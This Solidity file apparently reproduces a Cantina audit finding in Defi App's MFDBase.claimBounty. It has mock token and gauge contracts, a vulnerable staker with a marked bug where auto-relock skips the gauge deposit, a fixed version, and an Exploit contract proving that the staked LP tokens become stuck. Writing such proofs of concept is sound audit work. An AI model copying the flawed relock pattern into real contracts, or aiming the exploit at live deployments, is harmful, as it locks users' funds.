// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Defi App — MFDBase.claimBounty (Cantina, February 2025)
    claimBounty always unstakes the lock from the gauge. When auto-relock is
    on, stakeLogic writes the lock back into user accounting and never calls
    the gauge deposit hook. A later withdrawExpiredLocks underflows the gauge
    balance, so the LP tokens sitting on the staker cannot be withdrawn.
*/

contract LpToken {
    string public symbol = "DLP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Gauge {
    LpToken public immutable stakeToken;
    mapping(address => uint256) public balanceOf;

    constructor(LpToken token) {
        stakeToken = token;
    }

    function deposit(uint256 amount, address who) external {
        require(stakeToken.transferFrom(msg.sender, address(this), amount), "pull");
        balanceOf[who] += amount;
    }

    function withdraw(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        require(stakeToken.transfer(msg.sender, amount), "push");
    }
}

contract MFDBase {
    LpToken public immutable stakeToken;
    Gauge public immutable gauge;
    mapping(address => uint256) public locked;
    mapping(address => bool) public autoRelockDisabled;

    constructor(LpToken token, Gauge g) {
        stakeToken = token;
        gauge = g;
    }

    function setAutoRelock(bool enabled) external {
        autoRelockDisabled[msg.sender] = !enabled;
    }

    function stake(uint256 amount) external {
        require(stakeToken.transferFrom(msg.sender, address(this), amount), "pull");
        _afterStakeHook(amount);
        locked[msg.sender] += amount;
    }

    function _afterStakeHook(uint256 _amount) internal {
        stakeToken.approve(address(gauge), _amount);
        gauge.deposit(_amount, address(this));
    }

    function _beforeWithdrawExpiredLocks(uint256 _amount) internal {
        gauge.withdraw(_amount);
    }

    function stakeLogic(uint256 amount, address user) public {
        // @> VULN: relock restores userBalances here and never deposits the unstaked LP back into the gauge
        locked[user] = amount;
    }

    function claimBounty(address _user, bool) external returns (uint256 amount) {
        amount = locked[_user];
        _beforeWithdrawExpiredLocks(amount);
        bool _isRelock = !autoRelockDisabled[_user];
        if (_isRelock) {
            stakeLogic(amount, _user);
        }
    }

    function withdrawExpiredLocks() external {
        uint256 amount = locked[msg.sender];
        _beforeWithdrawExpiredLocks(amount);
        locked[msg.sender] = 0;
        require(stakeToken.transfer(msg.sender, amount), "pay");
    }
}

contract MFDBaseFixed {
    LpToken public immutable stakeToken;
    Gauge public immutable gauge;
    mapping(address => uint256) public locked;
    mapping(address => bool) public autoRelockDisabled;

    constructor(LpToken token, Gauge g) {
        stakeToken = token;
        gauge = g;
    }

    function setAutoRelock(bool enabled) external {
        autoRelockDisabled[msg.sender] = !enabled;
    }

    function stake(uint256 amount) external {
        require(stakeToken.transferFrom(msg.sender, address(this), amount), "pull");
        _afterStakeHook(amount);
        locked[msg.sender] += amount;
    }

    function _afterStakeHook(uint256 _amount) internal {
        stakeToken.approve(address(gauge), _amount);
        gauge.deposit(_amount, address(this));
    }

    function _beforeWithdrawExpiredLocks(uint256 _amount) internal {
        gauge.withdraw(_amount);
    }

    function claimBounty(address _user, bool) external returns (uint256 amount) {
        amount = locked[_user];
        _beforeWithdrawExpiredLocks(amount);
        if (!autoRelockDisabled[_user]) {
            locked[_user] = amount;
            _afterStakeHook(amount);
        }
    }

    function withdrawExpiredLocks() external {
        uint256 amount = locked[msg.sender];
        _beforeWithdrawExpiredLocks(amount);
        locked[msg.sender] = 0;
        require(stakeToken.transfer(msg.sender, amount), "pay");
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 100 ether;
    LpToken public lp;
    Gauge public gauge;
    MFDBase public staker;
    bool public withdrawReverted;
    uint256 public stuck;

    constructor() {
        lp = new LpToken();
        gauge = new Gauge(lp);
        staker = new MFDBase(lp, gauge);
        lp.mint(address(this), AMOUNT);
    }

    function run() external {
        lp.approve(address(staker), AMOUNT);
        staker.stake(AMOUNT);
        staker.setAutoRelock(true);
        uint256 relocked = staker.claimBounty(address(this), true);
        try staker.withdrawExpiredLocks() {
            withdrawReverted = false;
        } catch {
            withdrawReverted = true;
        }
        stuck = lp.balanceOf(address(staker));
        require(relocked == AMOUNT, "relock accounting");
        require(staker.locked(address(this)) == AMOUNT, "user still locked");
        require(gauge.balanceOf(address(staker)) == 0, "gauge empty");
        require(stuck == AMOUNT, "lp stuck on staker");
        require(withdrawReverted, "withdraw should revert");
        require(lp.balanceOf(address(this)) == 0, "user got nothing");
    }
}
